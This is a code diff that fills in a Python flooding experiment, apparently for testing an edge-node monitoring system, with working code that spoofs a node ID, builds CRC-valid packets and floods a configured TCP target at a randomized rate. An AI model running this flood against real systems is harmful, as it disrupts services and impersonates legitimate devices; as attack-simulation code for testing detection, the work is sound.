@@ -6,7 +6,33 @@
 """
 
 from core.base_experiment import BaseExperiment
+import socket
+import time
+import struct
+import random
 
+_PACKET_FMT = "<HBBIQfffffffffffffffffffffffffff"
+
+def _crc16_ccitt(data: bytes) -> int:
+    crc = 0xFFFF
+    for byte in data:
+        crc ^= byte << 8
+        for _ in range(8):
+            if crc & 0x8000:
+                crc = (crc << 1) ^ 0x1021
+            else:
+                crc <<= 1
+            crc &= 0xFFFF
+    return crc
+
+def _build_flood_packet(seq: int, node_id: int = 1, ts_ms: int = 0) -> bytes:
+    body = struct.pack(
+        _PACKET_FMT,
+        0xABCD, 1, node_id, seq, ts_ms,
+        *([0.0] * 27),
+    )
+    crc = _crc16_ccitt(body)
+    return body + struct.pack("<H", crc)
 
 class FloodingExperiment(BaseExperiment):
     """
@@ -32,44 +58,87 @@ class FloodingExperiment(BaseExperiment):
     """
 
     def initialize(self) -> None:
-        """
-        Load configuration parameters and prepare the packet generation pipeline.
-
-        TODO (future implementation):
-            - Read target Edge Node IP and port from self.experiment_config.
-            - Read the configured flooding rate (packets per second) from config.
-            - Calculate the inter-packet sleep interval from the configured rate.
-            - Pre-allocate a packet template buffer to avoid per-packet allocation
-              overhead during the high-rate run() phase.
-            - Validate that the configured rate does not exceed the hardware
-              transmit capability of the test interface.
-        """
+        cfg = self.config.get("flood", {})
+        self.pps_min = cfg.get("packets_per_second_min", 20)
+        self.pps_max = cfg.get("packets_per_second_max", 100)
+        self.target_ip = self.config.get("server_ip", "127.0.0.1")
+        self.target_port = self.config.get("server_port", 9000)
+        self.node_id = cfg.get("fake_node_id", 1)
+        self.sock = None
+        self.sent = 0
+        self.errors = 0
         self._log_initialized()
 
-    def run(self) -> None:
-        """
-        Execute the flooding experiment for the configured attack_duration.
+    def _connect(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
+        s.connect((self.target_ip, self.target_port))
+        s.settimeout(None)
+        return s
 
-        TODO (future implementation):
-            - Observe the baseline for pre_attack_duration seconds (no sending).
-            - Open a TCP socket to the target Edge Node.
-            - Transmit pre-allocated packet templates at the configured rate using
-              a tight send loop with precision sleep intervals.
-            - Maintain the flooding rate for the full attack_duration.
-            - Record the actual measured transmit rate for post-experiment analysis.
-            - Observe post-attack baseline for post_attack_duration seconds.
-        """
+    def run(self) -> None:
         self._log_started()
+        
+        pre_attack = self.experiment_config.get("pre_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing pre-attack baseline for {pre_attack}s...")
+        time.sleep(pre_attack)
+
+        attack_duration = self.experiment_config.get("attack_duration", 30.0)
+        self.logger.info(f"[{self.name}] FLOOD ATTACK — {self.pps_min}-{self.pps_max} pkt/s against {self.target_ip}:{self.target_port}")
+        
+        try:
+            self.sock = self._connect()
+        except Exception as e:
+            self.logger.error(f"Cannot connect to {self.target_ip}:{self.target_port} — {e}")
+            return
+
+        deadline = time.time() + attack_duration
+        seq = 0
+        last_log = time.time()
+        
+        while time.time() < deadline:
+            pkt = _build_flood_packet(seq % 0xFFFFFFFF, node_id=self.node_id,
+                                      ts_ms=int(time.time() * 1000))
+            try:
+                self.sock.sendall(pkt)
+                self.sock.setblocking(False)
+                try:
+                    self.sock.recv(1)
+                except BlockingIOError:
+                    pass
+                self.sock.setblocking(True)
+                self.sent += 1
+                seq += 1
+            except Exception as e:
+                self.errors += 1
+                self.logger.warning(f"Flood send error (reconnecting): {e}")
+                try:
+                    if self.sock:
+                        self.sock.close()
+                    self.sock = self._connect()
+                except Exception as ce:
+                    self.logger.error(f"Reconnect failed: {ce}")
+                    break
+
+            current_pps = random.uniform(self.pps_min, self.pps_max)
+            time.sleep(1.0 / current_pps)
+
+            if time.time() - last_log >= 10:
+                elapsed = attack_duration - (deadline - time.time())
+                self.logger.info(
+                    f"  [{self.name}] {self.sent} packets sent | {self.errors} errors | "
+                    f"{elapsed:.0f}/{attack_duration}s elapsed"
+                )
+                last_log = time.time()
+        
+        post_attack = self.experiment_config.get("post_attack_duration", 5.0)
+        self.logger.info(f"[{self.name}] Observing post-attack baseline for {post_attack}s...")
+        time.sleep(post_attack)
+        
         self._log_completed()
 
     def cleanup(self) -> None:
-        """
-        Release all resources allocated during initialize().
-
-        TODO (future implementation):
-            - Stop the packet transmission loop.
-            - Close the open TCP socket gracefully.
-            - Release the pre-allocated packet template buffer.
-            - Log the total number of packets transmitted during the run phase.
-        """
+        if self.sock:
+            self.sock.close()
+        self.logger.info(f"[{self.name}] Flood complete: {self.sent} packets sent, {self.errors} errors.")
         self._log_cleaned_up()
